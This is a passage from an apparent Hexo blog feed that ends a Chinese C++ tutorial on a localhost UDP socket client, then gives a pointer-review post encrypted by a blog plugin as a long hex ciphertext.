wsa;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsa)) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;wsastartup error!\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化套接字对象</span></span><br><span class="line">m_sock = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == m_sock) &#123;</span><br><span class="line"><span class="built_in">closesocket</span>(m_sock);</span><br><span class="line">m_sock = INVALID_SOCKET;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置远端地址端口</span></span><br><span class="line">m_addr.sin_family = AF_INET;</span><br><span class="line">m_addr.sin_port = <span class="built_in">htons</span>(<span class="number">9527</span>);</span><br><span class="line">m_addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//收发</span></span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">1024</span>] = <span class="string">&quot;由客户端发送&quot;</span>;</span><br><span class="line"><span class="built_in">sendto</span>(m_sock, sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="number">0</span>, (sockaddr*)&amp;m_addr, m_addrLen);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;client send success!\r\n&quot;</span>;</span><br><span class="line"><span class="built_in">recvfrom</span>(m_sock, recvBuf, <span class="number">1024</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;client recv：&quot;</span> &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">closesocket</span>(m_Socket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/10/25/tcp-ip/003.png" class=""><p>这也是最基础的一次性连接过程，而且还是在本地的。</p><p>循环参考上面tcp那种就行。</p><p>多线程自行解决！！！！</p><blockquote><p>能优化的地方还有很多，像send和recv都是有返回值的，可以做校验。</p></blockquote><hr><h2 id="c-socket编程"><a href="#c-socket编程" class="headerlink" title="c++ socket编程"></a>c++ socket编程</h2><p>网上的文章有很多可以参考的。</p><p>先实现通信，在考虑传输文件或者数据。</p><p>可参考<a href="https://blog.csdn.net/npu_nazi/article/details/123653422">文章</a></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总结不完~ 单独讲都能讲一堆，虽然也能简化。<br>不过对于这种网络模型，不管是osi理想的七层，还是tcp&#x2F;ip都有各自的缺点。</p><img src="/2022/10/25/tcp-ip/tcpSocket.png" class=""><img src="/2022/10/25/tcp-ip/udpSocket.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【指针篇】抽空复习</title>
      <link href="/2022/10/09/%E6%8C%87%E9%92%88%E7%BB%83%E4%B9%A0/"/>
      <url>/2022/10/09/%E6%8C%87%E9%92%88%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7aae258c870494d818f27a58c0a49f2c6f54a51ccd4a2b15db47f1e69f113676">62ab62b0c6fb1d38deb12c5aa8fecd644a14b9a70b6cb42ade1b9fbe749db05c81bb283045ce7e098dec09408ed397e2bf112a131819c0d8351bc99967a6f0d7ca33c694d5e5e204b3a756cb007a20535586c890c187d66a6a1048d41dbf1a7aac500e76954f4c7aac7447b3b9709c0eeb8b78ec862eb0e881511b540239f9214327f2cb3a2c3a9b966c831ee72fcd287d26a3da5e396f57812800b3a655e0112e3e32270e068f897041b58cc46cf97dc08fa7dbb81c2774e9910888247ac772948cc210772ff4d7312e1aebd7a449081ea68f9067becf58234d50ed05df455c7e269b61d357857a2e037cffe8498372b00baa7c2cf638c3a1c9490d879638b982b408b5f19dae4d67c97cff96a783d914ebde7378d8e6b0688ddf15eb1d8246d55cf41f57e97ceb9fd8e91d972018636923729bd0bd328a7d2fb18759e5b05ef0a1a57fe0716b6eb8090509e667b68c4963efa1d6fb6783565c506b278c5731715f44c1d4194566e5f6d4d47734bf003bc770cb30d1573582f042a303c7c0e08df2baeca652d4a9b019ef242f50dbcf4007304d4fbc0909fc8158a34317e7314bf6fe35e017e2e7948d4b6e31cc71de550ed33bc8e1811c269b7dd63072858b271dce5380b3b60bffd3be1a60bb47d4bb422a998e75d96c50bca004237525678d840f3462b7f59898078b36bbfc686c11b0fc41ef857377945052f48e3a9c0e48e310b850bd73ca352ae4c232298847303260280b4b35e2832f829f43738248a8afb8d3cda7d01dc98c51e49ed3a115048a59fab51070ce5bf3b3b7f7108363aa6468748f17fb74368b8a45c4e8008126171fdb2eef1315f8278fb6fa954b37093579034d3a77c8bcc6bcb01523a103579b9879299f07099d26fb460eddcd0a9dc2a25039981457933d59f19a85b135700bac13c497f8439ede496f6715a03c1fdbc8b9ea859240730946df903471ebeb0392ad38d0c657b412801b46e2fddb26acc9bf87e893c409d587560521099629a3b449ab4486cf47de9e5e603998f82a2ca818c7ccfbe5aad080b0d1504c04ef1748bc56ed23f5f5248c5d499735e571f1709d32627ad2c92119b98ed75c112ed79713f20319b7d65efbce4cf6b6d13f7775b746663b8ba503651d451bd40e6f1e0cc65e5760a28db237031f0b3d317b24442c9c2b29cd33f8234c457b7c60054b525f55c96b5a32126a21fa40026df9455b05ec0a2658f9ee8660433dd928f902d3418461aef17d82b44c368337de3069d88dea8066c8274f0b29fc11d618d0ddf7434838c38394271e1a9b0c7b894f4a3c379e548f23e061545b03f056e023e288959cf4226d12a50d525f9b8ca8f4724dc1276fc3161a37a11266f9a0d13c05a4326c1937887fff807390ff4da4ccee4b43ad9b0987242cacc42a7467c7e4d41c04af1da28b77f2dd759ee7cd373a721d50f14baf58ab9f9a91450e5790b973f2026b8e424e0aaa403d9668915c28f6f58f5ffb39a6a07cf200c73e957285faedba3eacd23e520475e3bb9acfd4d059e2a9b1d0805c78c45dcde2968718311306970268c61eecdc20ffac3fe473ba39061f834e2f90e96601f625b6f49db097e5bd5c2d2aea6a9d7b76acc69312b1059ece795d59118430778ad4fa067d3330b51771bec41af33389e174a65d4d5b14826b94d61b8639da3e414d6fccc99ffabab3c53d08c3dc29100f47f2c153be2b7c8f566adc1b662d510da7af659ffd61826f892de42508e1d16d7cbce3d6bb477f60b9bb93e9e80d5a84c72cac6ed4714c6f9b4f648caf1041dd8f480c01b8e1b2d82a653f0026abd8ff4c035f6d30bd70eac07f91dfb1fea79e30edca67a9f7a17a95bed972afa227d79e224f95ed982617135a2d8021dad6c9c98b92e004136aab1df9201736125c06a97442be8f731981496e1da8cd18956686a3e84a7d6abee4dc462f5e897d9469f46e1222f9ebaa3da6f5fed8de653a24e3de1f3b76b4947c30eb99f3d279767d0d2a64e71049b595056d9f15e618e12000eea06be1198410dc77ba1ae63483b051781aab391d3bdf50fde88a32e82b805f4e1386abe37cb5b497c254bdcee394afcc8eb4335c9658ed0d305bdabd9a1c6c6f2ea3aa2ae9bfefd76953d8bc5f2bf476f587b8a12347e63476835cd9ad65bcb6697c3931963874ec76d5b1a774f688e86d420ddf008d8476d47b8e0dfd8b072c08328cf899f469cc8292792a707fa73d3e7ee255a40c16bf2827bbbfe8b430ae901b112b294d74334574d127e4ea041a0ea1fb95aceace8a7393a18be8ecc2d1cc7c9049d320f5537265ef5810cb64eb7a6c15987458d3d59db934790eaad32045982648b5d30b235c0a546fda1c8581cae82ecb07f3718f521ce5409eaa5d89e7dcd58e9f1fc1c92796581dc6ca262a7a71955b7ebf95d03f2935eb8293965051dc820b3378d598b98b800eb2c44644205e4447050dde3dbfd86347f9fed43c5a91fb74d1fcd1b8fe89e72af9863e4df27854b2db426d40fa83e156d60840181000065d5449956d7f1e26ed3d131fbed4385e2030d87e0cbaacc7f78ad5380a87d0e4a3b0a01659768f7c3f432277bff31a7241410688e88a709b7069a1e3a1a29b3c089c8ff8d0d7631efa8d041a9b73be24af1f1de30991c351bd13f2037dd75f04494e5e8e6e235b4c2f2519646f184b0086e4cb71890060d10c151e7ec53f0ef385498d8521d3d49188f1c4753cea5979b9d29f38bb9a4f2d0bc898ff568fd8b5379a0532936400efcb176ee9c36a14e8caafd47945bfcdfc3eee8d120c2188bcf0529776cdcec35e4515ed402ad4d930755a37f234143509f61b277d1a6f3dc862d844cd5ed5c1bca8617ce9431f256dc81ad23b666195cf2055858c658dc47fcc7bb2338fd60ef83d28e9f85e1e4d209eb51016730a5b8a95db23e75f7322cbcc3a813cba8abe40fc22c6373ecfdbc29d42feb16e48f55a62c8fde4d5f3e5c30679548edd9c64647972ca62f178e2088442133314158348cbf5e340b77e35d546a7ba301396a58155b216bd60dbf57ce01a563e812ef5f30a4e496fefd3b0d820d39303c00084105e22addf854aee54dc2bf4ca3b8be97c2d63ae80f9a024997991e1037d94fecea69d50f1ab4569cefd23725dbe99c1dd7ba8d6c4fb34899bf570c496125b488d324f705bd7a71341eeeec0cedbe91d466c145fe6caa027277dbd925a6a6f770d4c2ce94dbb6c52b87f226327aeee1aceb90f43672da21122220c5bf9bc02a42ee8e0c0b901b041d5af3549fff344b2bdee365a0f71b63acf9a2f404860e27bf8b9f069cfbc6f2ccc488e9e08faf9d0c2be47e5a6a237d2632751ed7b03775db6c558a339ff060b2fe3284b6fe10497776ad017357d3ea31f4643fdd04ab320a0d6d26c1f41454cc3149ab606a608cafb2687b0f1f0e678a675f0694e854cd08cbb020725b27905b99161180d4dfce1fb36fcce9712372d21870bb9da82088f53787a8e3edca0b3cdb1b6d7c92eab73e5a032ca2618cdc3af25b00eceeb20ab1ff30aba70b6edcf5a91769a444c9662566f41e9cb7016923abea1d78470c8bc27f9370d85a6f7373efa5edf568c00e3a51acfa905bb249b59fc12dcc1a6be7fe88bb34e595f73b1a1c6660cca25e7d835d7a3e5bedc790fe88b95e70d66094d9c71da39e2834e4382d9fa4f3ff6ea71e5bd0ed4bcdd9a6288acaf62ccf01112af2b2adb7f664265251bbf93b1b89465cb14dfc11fb531d8a18258e444553aea0b6be02670c8615009d4435c8e9957b5dcb2e30b2c07d1a952d5237750114e86b55b48eea3afaad2cc65ab2065f57ed498f93dd9025eb4b33fb6232ff172ac535e77dae69b51d8f956f8f9a0225b8c19d1a2805b422ef61682b3606b2087a9d0669df7125d06574cd0c189221f109f5cc3e4a534375d3c5e24c4f881119f04fd6c4291b00eff9062251d8ef52616162ee11a5350eec76fbba9f94b75ebf615a1d1fc23f7a0c75913493c6c25bd25b94a5f43485e93422f8ccca5dff9ea75a753bbc631ccb98aac60fa805d8f8de6ab04f210996eb2dfe8939dc4593a6ce7b5172bbf73975c9ba93f81155b17839daa40c523f173eeab836df0f0b2845cfce64617939e0c7ef0c3ee3a37df8f7e4d1d540a9ad304042db1dacb4bbf12c0a89b4d85ec278adaab08a5e4b568b7d87d98316926793226eda7ac5d5baf15e4453343c2bf6ae50f638a55308e1ef5580e234fd3edbff6ab66c4972d3b3a872502a04bd14d1e25a31afcebf8e67c1b5c0d2c590a2586f9c604ad2cf3670e7437c23b3474c70e52316ac480f3e37389ba93a480e25b62a891336ae00aabff4a8c2994224e432b7d0b6f440b1ff4431f2ae9af5f2f57f565fe0e29352830e30f748058f36871b25ddde3735776f0d8e06db9e18a738682cd131c46b010aadf9decdfba2deec7b8ec077f9b43b83099099a543c20b8ee0ebdfbea94a0f5a00c100e9b1f3de3853c7a0600a61dcfb0cceaa90c10d5c958dcda7b4dbe3c111c0a0d006f28f8a5504d065d18470d7fd5ff1dbba8f06700eb90588e4c3ba79f7c8b2becf698cfdc4f7f72357ef450b6b3864544e3fe674f0ca03fa56ba549aba193deef25f27f98c676aa2f8c4d657876918ade7675b4779df12b64612196e581124eb2db9cfd644c53390a7a5fe105a8405f1381a1a28d494015a920c6401145e5b13d6e3ca2f5ec59be0201a071e3153fbd6477b32ea86bacefac32b6f918d8627b4b0ec45ab8cdf09cf979b77e9c7b60a25b0f4beb85359ba7fd44ceb20aeec19f1c2586cb1defd4a0a86fa613710a682ca6d5d053e96139d8707dfc37fedb27a98f9bb8096d97cab1f18d42f96c55466b7d8b86b94feeb0fd16f3a8710df546f0c2ca49a7e8e14d94e7d9bce6c26fd480c1f10876c4e6e31312f35034000daf2fbe82e05864c33194e6d00fa77839915e11c4317b570317ba5a0a0f97faf2519ccf04cc0bd393a12b4ca63166c046596c982a37ebcef8a246a2d5116b6668600726bc8140a2dad1391ad6db3031fbc16b2e4825852f0d96cd265f947b24f3eca3578cf7a5128b4e5c5c844943358110d7d1f2a306f502824e01d8104ebeca999d7d07f809d14ea9adfb3c7b48300ff14656ec80710a6872198a790d2c03f9480655f2922ea5ab6c13f7cf3dc7447eba5907046475972c8d352a9ac2d01827f0342584afda11f70220bc09320e849a1df2ffcfc0da4d0aa55ad20fe262d7be234df706b24f23e7aa5fa73a83b7432daabbeaa5f8e69a6f9f81c070fc7d0e1167148bc0df62678d9b5e452c6a9cb2c844663efb90e4bf7367e486ada043352cbe4ae1db9a48ccfa47cbe787a58c306871d319d139aed3789cad2adb5462145157427650d46f03e54d8c58f195734a49c0c9cf5d3bf8b415f1b06e53148e62944542b835339eab40922cc448a88710a75e51c94fe7555a9a0e457c22c496cc4e64192a55cbdcf1117668cb28fd09d1658431bfe2ccdd21cc6c6179560cbcc3665b5c525b077544beb71d90407906627e4444ebacdd5801c87b000565aef8ccc969f81cf48bc22333334d9b85e061a8c059ec451a09de8c02f6354f2aa1f7f424c2331675c67c78f5cf820dc93009a7e375d09059dfdc2e357eaa70135590fc051c4bc90e5c38d1ec8af0799995117499e79afe525c04493b694dbe441d34baaa3c8643fe7592bf5493e0d31662b7905e121c2e0170741384a4b87f49dc4b1dce2fbc9699f2aca41b8f940d715c62a6f4021c7467356dae68c49b55994673842098418996fb23a9592490b6c7069a796376a3093325d80b65033f6af4790ae842ea8cbba7f0a4f0b33d524fbb16070c4bc59a4257f8cabcb7c22ab8fb92fd952ca6669f24a3a784e2fa2727b943b0374e0298cf76f3a99155a5de314d39e3902b7f5b9c1e365e6604c89509d0fbb7e797b559920f1d5d72963ec99812aeb478de330b7a4f10b59e22e63e5aeae03e23f56c70d10d9d55dd8538f3b5d1a9669cc6aafe44da1cea15701b3600ed6562685e8a85d42be30af3a9a110d4506d2b5b03d2df5ac264c91fb71f33af4dd6444e94857cc431454d60ba9c8c1689a65c0dff2f036b053f98332376ff47808fe2d5b5f9b8ba69b67b36214ce9cfba2bc471babb9f8effc91d522853bb32f2285c124f48faf7d20d7f4ea7131a310ff4045fb28b2f158bb0c3885535b948a181faebabd0607dc6ae6dc85c61129f9026ec90c111b33be97cffd533220908e7ec87e771d8834bc15820f5ef1f3a7331bf7498748869cf3abc639b44b0017a0d153118b9c9dd8d5a35601c9e6d643a946868db2ed954268cc776d613386b39c10dbefb30fc36a0220a61157d2353edbf9130155cbc377bda64658ac8ab87f942bba47d6e806863f089150781eb0fe09ecc81e9e5f567be3054ece4b0a1781bf9215e8389a4443c19ecebade0783d2ca9b789a9fb96341fe5b3fee3a1ab18ef08c9508290fd52ac0c54856ea515e35d86f8dc221f2517ea902b50469dcc341a45d096d24d4759fed8e02113006c483d51e9fa19a419b8839813174601f2ab0f7b596cfc11317af9d1dc324265e20a690f0022fdfc5fc545ef5885ca35b5b932209214b06be762bd1d676a407b12bbec2236892fe19c9aac535fea42d3492db22fb7106a5c3b6f02cf66fa4996c7a2a5b6120f5023c0c31b8205a41a585376336d4618d305e4b34dff5809c1b974da5130ba6fb6c963117153b17f283251f1b22e2e2ab0ac690db0506512a671720c3b787592676ed26b650de8ddd96a19d941772195d3b372f6f7cc3777852b9132861f33224316c372ae72fef3e757c30c60fe52804ad01f90e5c1a986dc52aa8695d4add66f72efb51a0639b5e481b84f1c8b2c98e4c986692775145adc88c8aa9de505a84d48b3d4086ac4893c476f62f161be21d15014bdb3f757b6875997ce8bd5bcd3887ff624632f21f208770edf80f6ddffd4b13b8932939309a884b99ff2c627f00b2cbe8cd02076fb3e8b75f4c43cff0755f6ab205f84f9f5cb2b04a86310e1d41bfbfc48fd8e7c6ed629ddc3d9120f7b5ebcb20055b0db7cb73a685b6492b51b507dce5e0a88473f64a6813c15ddd825aaa68d980bcb547249a3e9ea8f037aab4032c757e612090d56291551a7609b58f8b6f5ad6bbed889117a3ef46a53a5f17d328d9a9fa371c3bdc82127a82b702318445e9fdaddf46783bc5bb27b6ae9a79c836613ca8836a1aea7a22ae8b8a7498681ce9d151e84e4c6ac02742b23c8bdc1be7109a711a36c872fc540ee401f22caca3404b4ff176b2b1359e92e8d8ed6a13ad37d108b14729bbaa9c6f69b02c6cbf710ea8b616056724c2a90f7b710bf7dc1c7786001b37f31cda51474bf8c849617f88e1f54b66801cb210f7c4774e11fd2c733109b3f4d702d70b6941acc613c371d67a8d9ecd927ec47c1cbfb5359ccd04a3c66b5e8b43e96b06bfe784e4c9c3dd2c2d14beb29f64605dd733f5f74e28631933e11bbf1ec3b45c05ee4f43b8846d6e9834784f9f9575a27563799b1f86aea6362530b9ce7e9b4cc51e5a779520d5e160549dc99458919084392a0455f62f4add7fc2135977f861d5d3301657110f2d663b2a5c7d8be8845c74ecac80dcd844725cf989cc056f31ab3b8eddc57f05ab8dfbd40f021e3292bef287af038aba7a17a8cf76d4dfc4cc004017133b92e4b82925d8d2e64c38fe82fa134aa9a6723cec9d4d865e7f5389d4335fba13ab2f8d0c5c59e65474db86986d7c94aa19d1817ebfb0d9d4ed87ce6002fd4a77d799d76753da2e81b83c03d46d28a9ec3ea736586fa2d01b9264de71a2abddc94e47124eb38ced99c1890fa514abc5c8810f56217ef992a9863fc31a541626cf3313f6711ffb1cbbb602c0d0a7c669cea86670df62f8ac89a1d8c7c37f9d31568a7b97c92b8fa9dfa57107b7f19bee5b4adf83d33c81b5b0a8a027bc5acebd53eddd895d13e32f3fa1c28aec004956e151a5c56fa3fe33776b6f359f04f226c4dbe04205e215b8699d2135f5a8d30b51a96df18c2ce2b2e193e05df5921f45bf99c1fbcdc4dbd0811c17890d06597f4a5620343b33fafcdade89031c1cc62d4947c958b601f3e868e6d13ed535ddd816bfa25d22a82992663c0777c3994842478b054eae4765f54378d5d1e20b8a38bd9eebb6bc8cf72055a555e36044580425e3897a6f9adcf3bd80469403c222b957783ae0de80d052ab15418078d265d6589b6c2096039f1117ef1d918919b14dab6c4e04c7f0b51b2ef65b551a32ff720d9c65842321bfa4f5323dd53f51826b777cb71f324c0ea0fc4da5b2ad0ae698d0ab43a7da19341995ae64f147048c81cf837ae7c8a19619697ab8d9fbadcd961224a348c675e95c52a7055dae012e3eb5681fc74f866cd326c16df67ca25938663b27888f873011578344013da8f8cc2fda4b415c2808f6b22818f6829650bdb3e5348390d314bf3a72c21750b5e1519497f4f4f1157b3cbf8bae52aca2adb7caf8ad6f2eb1de5f9edfed6bae08ae9d47bf0ee6c5a065fed4bc386d777afbc2d3cdd516f9590cef574e813314fb05213b6f89793a0017e7ec63137a6dadca2d8e612f32a7c0cc4a3022f7d71c7c3b38205edde95691cee00cbe4e191390b10a60b65a31459bf8c84e9b7e516c5d39558cdfd7307df1ea7e8289b8ea7cb9aef0658c09bc6d59915ec5dd96be27d5363c986fe3e292050918c33abfdfe8b7a7546215ff0bc4fcfc88939785d6f519cff938e61aad2edfd9c97bf9ef68635d307023e4dfce7ae4ba19eb87cc308a799e8d93b5951d2dc9a1d423f5b7235dd0a9b89fa7b1efc0e0e706aff7b7369890f8f82de15d0f98ce3a1bb4f76eaf5e25d688bdb54dddba5ee02e86a79bd76cb74f35baed47524684efc44689ec25888614cbc6e34d7ddcff683716517763d40f865815f2d014a51876cc93d06039dae95af069d3274f31fb3a189571d276360cf1609d33a49e98b880e7daeb5654c99c86680d6d1e5412bc226df27f7f67f903ae5f6a2bf5b4d7492496a3a50922a272ffef008efdf9d299b91b1e1f2e7fec0f74a3d2b3968c278f6ece7d7d46897b92d81f6b99eb83d4669e5643c9db34e1fce23fa18d294351122d521c3c6f2e8aef6797ee0b5a68f6af338cede7f4d5e3439c1245776e299443741181950e8f04379c9d058d56faae63e7d1a52e33c5ab9e66b99c331c2a9ac65d142e1f80510d1165cd687c44cf8f66d596b4dd3247cd7238c30bd058cab70bea3c706f5cfca0f5f1e211cee16778fa7a44d317f9ff860ff04c1ca09b6e701b5c8a7dfbec95b54529dee5cbefcc488f9767a5028bce35a95288f8c893e667e870680e08f7e4bbdf86366ad63ed103747c37728967c56b02ecd7f1a5e3339b060d8c54862a86e19c25039685e6387a6b7e2a5dffaa2f71152acf7fdc69193038d2750a780042efaae6557e78ce7b1533b17393d26c98e6f16a7308ebf1c9168d93ea5e69678c9a7f005abb0c8fa8e342b5e1596974f761e19ec2cd07346c7ba70e1afeffbf1e1ecbca88bc5b64e893c5f9a9ea18a1d2753e2c0983ebcd35e9337f6e05a976ecb6ae9d40a6f121c67a26b081416882960bf90b5bc39ceea1ad45d61e511fafa9bae0b6b838d7a128f5b3585b614be02807afe1e370091ba875005f9ca5f8247bc74c630fcfbd359da91e8d79b192ba31607e4323e3e085178de36a165e73bfa67b34f33876135c8b23131d7536fc02572d0e2fa5ffcf86e1a20226a98c46a09562a01e012cb0cc431f9839ac8f22f8ba81b019722388216f640fc3520d077afef7a449e541357f59247e5cb4705035b26de009923a26da504dbaac188e8f21b316c91a18cb6d6da317e2b4077462f8c9da8414f365273a0511d5f2e78ea084016be7bd0c7a1e5799fc533ac821f4f2b37cd92bf19b265fd50970c654b4e1b7d9e4c72cd97eec3985ff908741dbe23108ba70c01d71823a209d7ea4b408701a886fe133d1fc427e9800780a95b28805a601a47f92159a491717fb6e4697283e9061b7191700040729d515196d438c450b583d8778d6fbfc600ab38015d5df3e665c696383bb6ee10a1008d7905c1e974ab98542bbad5ea4afc161caf93558296804b511dc735110db1a063db0d15fd44d25e5ad6bba4da9feef95cf9503cd94d29c47cf5ee51602f0d50502a779563df3523c856e73de18d1d8c10febbc9dddcf55b48621588af520afbf7b8ab9ca08e50fddcc1e8f2333ae295575a88af79972b9b5fc418140dab9403025829627f49d7d14e0f3612f5a17b79bcf3dedeafed1ecfc300b2834f61dd40a7ca05c234e23fe8303fdf3f162fbd1dbdef8bfde92cbd2ab3b04b7f66b4a7799b3d805ba5874fb32110f38f17b9d4dc41f60c3af485855ff11b1cd9b0ce21bebbdae71b3e526389c9dbbc8757f9f88dbd3a9bf5520f0b6bdc82bd55d5609144fb136fd2e0001c1fb856a11c4f91aa4ae260198791796ad33a69cc735f0704b0a99e0ce442c041555efd9725c16b6720caf5fa470b858749ec935ce1dfaa174d3c3b73b267111fcefc3e6296beb958d3545afc2add049262a6bc39c0b9854ed29e9e6909e4cb16c554e89f6e7d20b715dc9dc07d10e70ecf89ddcc5b6c097f40e352eeafd6efb2cd89329934a97aa9d3045ee9b283f0cf354478d5f28bec96609a875e2c0761fc672df3162dc7e527b2101d794567eed13f3deeaa92c7facad404666168a9a0b6f51a3b856ba65aa28913cddfc6abc47f5fe2a9da148daf4f6353d8767d2338a29b9e4a533992b62752c82b70634d59a6bb8b28d2856ab6caef53a43eab4a984c65a0d4f825f9ce1446a70dddb646291a532e72f7a576e2b0ca1b7370d162f9e66e1dbbfab8803f56e8fd60be00f4564bc2b2c2b005448ab31cfc4e9d6c901d4601ee11fd2d0c0351f73dec75e4537b0a8a42349ad687249bc1d4c46d9ebf036e3639c53a08f37a58b56e721749be553874573b6c668a2ad485d64c452c8468e1e49f2ada1554ceb7ed04a491c8aac1474b073f9d14b6857e7ce9b549d6953f2df405443d42e1e541c5cd5f74a745d71ac26d0963a381835880ef541dfd360a5a7a3ce1d95260b1089c16ab6030f49c1705f9c1025204e0f808074cc5eacf3cf08b84166a37bdb03cc391b5fe30ce37e1284707aceebce1db5fec66fc54f27ab2089a4dc5c92996bcbcf5c8fe652277d017cc79bae76874d085f4adbf9f44175fff54307a8f679f63b173bd62757ed6b5233912032309efd7343932e58e320af4f1462c69b956e780efb98aa81f96cfa352fd0523781d5bcb2fbad986b029fb11b0da0315127b0e38a098fc05ee47ccdde39a0144b243f0c8d1062ace2412654798113aa680734f5b115831150865faa11348a0b38ac5349b23cbcf6e8dd87e010e0c4f42b36c65fe773bab2011b689598aca0004fd66f866857e2903981ff2637887d918421c953848e0dd0860496ec52d30b09db57899ff8f13b6d86f5b4fc4aa6a9b8873e279892afda79db1f891125e141ded9e0b43868333e4458931a2638b9ef039f4b4df16b0071d1c43b38841e9c3ae6fb78a66942e2fadb46320746f2d1454ffc967127e3c19dab8647eb89e594286dad65270ee0df06f7b2070eece47a75c34b467c96c319635797d3d004731d213963a7fa847eb3619513865121a1693d120f0db92de5982dbca4f334c69af99c7d21b14190876e3851a61f8ddd06581ae6a82c9b1df14a3402e4be39a57273ed1de25cb98c52c1dbedfc9ec8d8a2be4798ccc0d8c23917ce41043c0ca612acd1879e4e76e1a21a820c6141a1a052bb6118075454fe2a07ad0e57546ea3923a01047711b227c3f14f5c88cf56731540e6f968d579257d538029ede232ef04cfa3db3d8800e0f73f521c26964d2f2efb6b6937ad7a8485d85dcb2321d9160cd61dc7dd5e82d117b417ea1bc9bd25faa10f9120b071d43513eacbddf874284d89907958c4b516335d9a5690ec9c3b5377668ec73ce5d3d0a771334e47bcb3930a56d92d677ac1f04955cdd8d0e34ba8674495763acc9456270163a815fa7bab4ea5eae02b24d417d8a498b514d1b6ae89424b2f7aafcf829e7abd26871fb1c9021998972a59a97f7993216de2c511e5d533f9b15dabcde5bf5f007f354cf7fbee0a6230b4e9a6244dc1edf1ecfd76314fa07201bbb683b556f8f4222ad33d846cb874c34cf0a40cc9b5d6cc67c797f4763f603f9c0f56da70a5d59a37b6c73d41713160ec1bdf78efa370aae649c48b68e1f95a231c23c1d22bc16058e99e52ebb53da45c0c23a105ba3d6a7f7a76691ae3a2ee3dcdf90cd26921d26019907e082b73a458d951d0fafe250706ea193ae4c4550eb0b57a84e7d4a79e2ea7e3c653cffc7063756ac16d1d720e37c92857b05570e49dd3c791a1d09e89f5179567ad63981aff0b70f29998986fa82e833ceaec19a475c771f9ed8308f901d974c823776b603424ef6d09859a6894fd00932029db43add3f6ec72e9bd69fefa61ebd5e91a5ab627d9689a1473aef64ecd8b887eb1522b5fa60e8b8013ce65cc651f3c563ab6afca214e52c49b5dc33c3982e0e009ad5a8a6725e3825b7895adcf87ac0b328fbc416a489565e0a36e6e8783e6e8ffab9ffaae22259111ae54c0f7f54621e92bb7dc01b0dbe47ede5100b59b2e9068567637d5dcd80d42c4329718267812c30deee4ba37a110924b5cbc98f47ef2895c87aac52a2d7f0403f08f6e0c0923b91c1e82f80f58eed1e528ce9dd5bfbea1aff7ca2a34d02ebc23e3bfd2321c135fbcee237b8e4813ed94f07a71254a1029b2f879153d1d7c93c9b379cad29968f417e8ed5add45d490a236eeec99b1a4d2832385aff9d9f6e3200e22d8c8c1e9a676f5d228283dc263f7a000212b0c09dcb999914fedfb5298e88ed6d4614c3b78f666db4830db942aba31f92deede743d44947c0f9c2f15f5e1aa7adc475e6a484ad3039d2d844af3679cad2638e495dea45b9674675a268450ee5406de028de418002e133e814f3a67d760789ec3c8b0103546d86b14b94a9d78ba6f6fbea7e85521f622e26f79616e48fee6c676570272fd5201f4e0e19839ca7a4e7852735cad4eaade8ad1dc33ac280b681e8daf65032ba8624beedb2147a2db7d2b061782bacbde916354504c3e6d38645e5ce5ddb45ad65abc90d3c72ee8d9e19d5742aba6cf8c32c4f1d7ca15444a9e3ad814bd05c2ea2c7832e6efc36d71d3b63bf29466179d4e861ad57a79647fa412475e7f4a4507274f777d1e26d03f2e4762f9a7065eba54aea0afdc5c8ec9c0e4c4431705daa5b5217f2002c4ec198c1f5c78e8252caea7f523435ea9fe277f74a8ca0c908a46b80a7c490a2a227709fd4ed8e33f200b095c2851985cefe1d0aa61c1220704d5f4a7ee1e45be7f3309ccd195b587a2182f7ac91d67145e2554f65905d0079a118f621ed72d26f2866eacfd644aec3bef224d6898564381044bf7748f989dc56102b70714d4db9b07adfc4c638432f838bfb4a9ffa990df9ac941eff4a03c90544971bba372597b4450e2ad13de0c73dbcf50772ec0af67abe96e00576ec03bd0e98f980287ef7098de2b2ac2d05e9332d4972a4cb584625dfd70bcc3e1b411199bdf0519aefdf46d6db1719720372a603f5d946fbcbc448e054437f8e46a5b9f3439fcbeb233448dc8785892bfb8ed7241c5b6767783c4d53a88b2e4450a8ca7cd09d6e1641dd0ca741556155a6dd797c01b5b3bfd46b11cd885204767c71092cfa24cee3fd30a2d0798211ac95a89fd3f0309b4f650ca5756f60240b1eaf9c572062233f7f5a707eb7c630c9ad8e0eca4eddc117977783af67e9cdbd7cb5d03c25684393799a562d2b215cf6acba5c375b83baf4f1e09f250c5351ecf412eb032aea732225ed9ca59180ca38e4048f6e5e885c693a567aa458a8e075029b2ccdabec6523ff0d0643d667ccc717d523828742f